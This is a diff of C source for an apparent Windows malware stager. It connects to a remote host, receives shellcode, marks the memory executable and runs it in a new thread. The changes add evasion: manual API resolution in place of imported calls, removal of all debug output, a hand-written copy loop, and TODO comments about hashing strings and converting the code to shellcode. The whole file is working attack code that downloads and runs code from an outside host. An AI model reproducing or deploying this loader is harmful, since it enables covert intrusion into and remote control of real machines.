@@ -11,111 +11,141 @@
 
 // TODO: eventually convert to c code then asm then shell code?
 
-#include "stager.h"
+//#include "stager.h"
+//#include "../utils/utils.h"
+
+//#include <winsock2.h> // needed by socket and connect?
+#include "../utils/winsock_util.h"
+//#include "payload_util.h"
 #include "../utils/utils.h"
-#include <stdio.h>
-#include <stdlib.h>
+#include "../utils/kernel32_util.h"
+
+//#include <stdio.h>
+//#include <stdlib.h>
 
 
 
-#pragma comment(lib, "ws2_32.lib")
+
+
+//#pragma comment(lib, "ws2_32.lib")
 
 //bool Stager::run(const std::string& host, const std::string& port)
 bool run(const char* host, const char* port)
 {
     // 1. manually resolve apis (skip for now and just include the headers that import it)
 
+	// TODO: hash these string literals 
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
+	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
+
+    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManual("ws2_32.dll", "WSAStartup");
+    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManual("ws2_32.dll", "WSACleanup");
+    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManual("ws2_32.dll", "getaddrinfo");
+    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManual("ws2_32.dll", "freeaddrinfo");
+    FuncSocket pSocket = (FuncSocket)GetProcAddressManual("ws2_32.dll", "socket");
+    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManual("ws2_32.dll", "closesocket");
+    FuncConnect pConnect = (FuncConnect)GetProcAddressManual("ws2_32.dll", "connect");
+    //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
+    FuncRecv pRecv = (FuncRecv)GetProcAddressManual("ws2_32.dll", "recv");
 
     //std::cout << "1 - Starting" << std::endl;
-	printf("1 - Starting\n");
+	// printf("1 - Starting\n");
     
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+    if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         //std::cout << "WSAStartup failed" << std::endl;
-        printf("WSAStartup failed\n");
+        // printf("WSAStartup failed\n");
         return false;
     }
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) 
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
-		printf("socket failed: %d\n", WSAGetLastError());
+		// printf("socket failed: %d\n", WSAGetLastError());
         return false;
     }
 
     //std::cout << "2 - Socket created" << std::endl;
-    printf("2 - Socket created\n"); 
+    // printf("2 - Socket created\n"); 
 
-    ADDRINFOA hints, *result = nullptr;
-    ZeroMemory(&hints, sizeof(hints));
+    //ADDRINFOA hints, *result = nullptr;
+    //ZeroMemory(&hints, sizeof(hints));
+	ADDRINFOA hints = {0};
+	ADDRINFOA* result = NULL;
+
+
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
     //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
-    if (getaddrinfo(host, port, &hints, &result) != 0) 
+    if (pGetAddrInfo(host, port, &hints, &result) != 0) 
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
-		printf("getaddrinfo failed\n");
+		// printf("getaddrinfo failed\n");
         return false;
     }
 
     //std::cout << "3 - Address resolved" << std::endl;
-    printf("3 - Address resolved\n");
+    // printf("3 - Address resolved\n");
 
     bool connected = false;
     for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
 	{
-        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
+        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
 		{
             connected = true;
             break;
         }
     }
-    freeaddrinfo(result);
+    pFreeAddrInfo(result);
 
     if (!connected) 
 	{
         //std::cout << "connect failed" << std::endl;
-        printf("connect failed\n");
+        // printf("connect failed\n");
         return false;
     }
 
     // 2.
     //std::cout << "4 - Connected" << std::endl;
-    printf("4 - Connected\n");
+    // printf("4 - Connected\n");
 
     // 3. 
     //std::vector<unsigned char> shellcode(4096);
     //int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
 
-	unsigned char shellcode[4096];
+	unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
-	int bytes_received = recv(sock, (char*)shellcode, 4096, 0);
+	int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
     
     if (bytes_received <= 0) 
 	{
         //std::cout << "recv failed, received: " << bytes_received << std::endl;
-        printf("recv failed, received: %d\n", bytes_received);
+        // printf("recv failed, received: %d\n", bytes_received);
         return false;
     }
 
     //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
-    printf("5 - Received %d bytes\n", bytes_received);
+    // printf("5 - Received %d bytes\n", bytes_received);
 
     LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!beacon_mem) 
+    if (!beacon_mem) // TODO: checking if it is NULL would be more correct?
 	{
         //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
-        printf("VirtualAlloc failed: %d\n", GetLastError());
+        // printf("VirtualAlloc failed: %d\n", GetLastError());
         return false;
     }
 
-    memcpy(beacon_mem, shellcode, bytes_received);
+    // memcpy(beacon_mem, shellcode, bytes_received);
+	// TODO: copy 8 bytes at a time, and then copy left over
+	for (int i = 0; i < bytes_received; ++i)
+	{
+		((char *)beacon_mem)[i] = shellcode[i];
+	}
 
     // EXECUTE_READ.
     DWORD old_prot;
@@ -126,7 +156,7 @@ bool run(const char* host, const char* port)
     }
 
     //std::cout << "6 - Memory allocated and copied" << std::endl;
-    printf("6 - Memory allocated and copied");
+    // printf("6 - Memory allocated and copied");
 
     // 4.
     //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
@@ -134,18 +164,18 @@ bool run(const char* host, const char* port)
     if (!thread) 
 	{
         //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
-        printf("CreateThread failed: %d\n", GetLastError());
+        // printf("CreateThread failed: %d\n", GetLastError());
         return false;
     }
 
     //std::cout << "7 - Thread created, waiting..." << std::endl;
-    printf("7 - Thread created, waiting..."); 
-    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
+    // printf("7 - Thread created, waiting..."); 
+    pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
 
     //std::cout << "8 - Cleaning up" << std::endl;
-    printf("8 - Cleaning up"); 
-    closesocket(sock);
-    WSACleanup();
+    // printf("8 - Cleaning up"); 
+    pCloseSocket(sock);
+    pWSACleanup();
     return true;
 }
 
